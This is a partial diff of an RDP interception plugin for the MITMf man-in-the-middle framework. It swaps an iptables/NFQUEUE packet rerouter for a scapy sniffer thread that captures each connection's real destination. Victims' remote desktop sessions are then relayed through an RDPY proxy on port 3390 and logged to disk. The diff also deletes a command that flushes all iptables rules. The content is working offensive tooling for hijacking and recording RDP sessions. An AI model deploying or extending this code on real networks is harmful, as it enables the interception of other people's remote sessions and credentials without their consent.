@@ -1,8 +1,6 @@
 # Theres no way of determining the intended RDP Server from Twisted (from what I gather at least)
 # Also Sylvain (citronneur) seems to confirm this (Thanks!)
-# The current process is this:
-
-# Client --> MITMF (NFQUEUE PORT 3389; MODIFY DPORT TO 3390 AND GET SERVER IP) --> RDPY (PORT 3390) 
+# Currently were just spawning a scapy thread to sniff the dest address
 
 # Performance wise it seems to be ok, would like to see a pure python solution,
 # this ones a little bit 'hacky' but it works
@@ -12,17 +10,16 @@ from libs.rdpy.core import error, rss
 from libs.rdpy.core import log as Log
 from libs.rdpy.protocol.rdp import rdp
 from twisted.internet import reactor
-from twisted.internet.interfaces import IReadDescriptor
 import logging
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
 from scapy.all import *
 
-import nfqueue
 import os
 import sys
 import time
 import argparse
+import threading
 
 class RDPintercept(Plugin):
 	name = "RDPintercept"
@@ -40,12 +37,14 @@ class RDPintercept(Plugin):
 		if os.geteuid() != 0:
 			sys.exit("[-] RDPintercept plugin requires root privileges")
 
+		"""
 		try:
 			self.ip_address = get_if_addr(options.interface)
 			if self.ip_address == "0.0.0.0":
 				sys.exit("[-] Interface %s does not have an IP address" % self.interface)
 		except Exception, e:
 			sys.exit("[-] Error retrieving interface IP address: %s" % e)
+		"""
 
 		if self.std_sec is False:
 			self.clientSecurity = "ssl"
@@ -54,16 +53,16 @@ class RDPintercept(Plugin):
 
 		Log._LOG_LEVEL = Log.Level.INFO
 
-		os.system('iptables -t nat -A PREROUTING -p tcp --dport %s -j NFQUEUE' % self.rdp_port)
-
-		self.p = PacketRerouter(self.ip_address)
-		self.p.start_pkt_queue()
+		d = DestSniffer()
+		t = threading.Thread(name="dest_sniffer", target=d.start, args=(options.interface,options.port,))
+		t.setDaemon(True)
+		t.start()
 
 		print "[*] RDPintercept plugin online"
 
 	def plugin_reactor(self, strippingFactory):
-		# IP and port tuple dont matter because they will get changed on every new connection
-		reactor.listenTCP(3390, ProxyServerFactory(('192.168.20.64', '3389'), "./logs/rdp_sessions", self.privateKeyFilePath, self.certificateFilePath, self.clientSecurity))
+		# IP and port tuple don't matter here because they will get changed on every new connection
+		reactor.listenTCP(3390, ProxyServerFactory(('0.0.0.0', '3389'), "./logs/rdp_sessions", self.privateKeyFilePath, self.certificateFilePath, self.clientSecurity))
 
 	def add_options(self, options):
 		options.add_argument("--rdp-port", dest="port", type=str, default="3389", help="Port to listen on for RDP connections")
@@ -71,62 +70,19 @@ class RDPintercept(Plugin):
 		options.add_argument("--certificate", dest="cert", type=str, default=None, help="Path to certificate [Mandatory for SSL]")
 		options.add_argument("--standard-sec", dest="std_sec", action="store_true", default=False, help="RDP standard security [XP/server 2003 client or older]")
 
-	def finish(self):
-		self.p.unbind()
-		os.system('iptables -F && iptables -X && iptables -t nat -F && iptables -t nat -X')
+class DestSniffer:
+	'''
+	This sits on an interface and sniffes for incoming connections on port 3389
+	then dynamically changes the dest address in ProxyServer class
+	'''
 
-class PacketRerouter:
+	def start(self, interface, port):
+		sniff(iface=interface, filter="tcp and port %s" % port, prn=self.destsniff)
 
-	def __init__(self, ipaddress):
-		self.ip_address = ipaddress
-
-	def start_pkt_queue(self):
-		self.q = nfqueue.queue()
-		self.q.set_callback(self.nfqueue_callback)
-		self.q.fast_open(0, socket.AF_INET)
-		self.q.set_queue_maxlen(5000)
-		reactor.addReader(self)
-		self.q.set_mode(nfqueue.NFQNL_COPY_PACKET)
-		print "[*] Waiting for data"
-
-	def nfqueue_callback(self, payload, *kargs):
-		data = payload.get_data()
-		pkt = IP(data)
-		if not pkt.haslayer(TCP):
-			payload.set_verdict(nfqueue.NF_ACCEPT)
-		else:
-
+	def destsniff(self, pkt):
+		if pkt.haslayer(TCP) and pkt.haslayer(IP):
 			ProxyServerFactory._target = (pkt[IP].dst, str(pkt[TCP].dport))
-
-			mod_packet = pkt.copy()
-			mod_packet[TCP].dport = 3390
-			mod_packet[IP].dst = self.ip_address
-
-			del mod_packet[IP].chksum 
-			del mod_packet[TCP].chksum
-
-			# Some scapy-fu to re-calculate all checksums
-			mod_packet = mod_packet.__class__(str(mod_packet))
-
-			print "[*] Got TCP packet %s:%s --> %s:%s (%s:3390)" % (pkt[IP].src, pkt[TCP].sport, pkt[IP].dst, pkt[TCP].dport, self.ip_address)
-
-			payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(mod_packet), len(mod_packet))
-
-	def fileno(self):
-		return self.q.get_fd()
-
-	def doRead(self):
-		self.q.process_pending(100)
-
-	def connectionLost(self, reason):
-		reactor.removeReader(self)
-
-	def logPrefix(self):
-		return 'queue'
-
-	def unbind(self):
-		self.q.unbind(socket.AF_INET)
-		self.q.close()
+			ProxyServer._target = (pkt[IP].dst, str(pkt[TCP].dport))
 
 class ProxyServer(rdp.RDPServerObserver):
 
